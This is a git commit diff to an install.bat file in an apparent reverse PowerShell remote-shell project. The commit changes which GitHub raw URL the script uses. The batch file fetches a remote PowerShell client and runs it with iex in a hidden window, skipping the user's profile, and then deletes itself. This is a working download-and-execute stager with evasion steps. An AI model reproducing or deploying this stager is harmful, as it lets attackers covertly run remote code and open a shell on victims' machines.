cfaa77d8ca7b6a352273526095d74d2f9a938d90
PhantomControl <48925321+PhantomControl@users.noreply.github.com>
2020-01-15 01:34:01 +0000

    Add files via upload

--- install.bat
+++ install.bat
@@ -1,4 +1,4 @@
 @echo off
-set scriptURL=https://raw.githubusercontent.com/sweetsoftware/ReversePowershell/master/client.ps1
+set scriptURL=https://raw.githubusercontent.com/PhantomControl/ReversePowershell/PhantomControl-patch-1/client.ps1
 powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString('%scriptURL%')"
 del "%~f0"
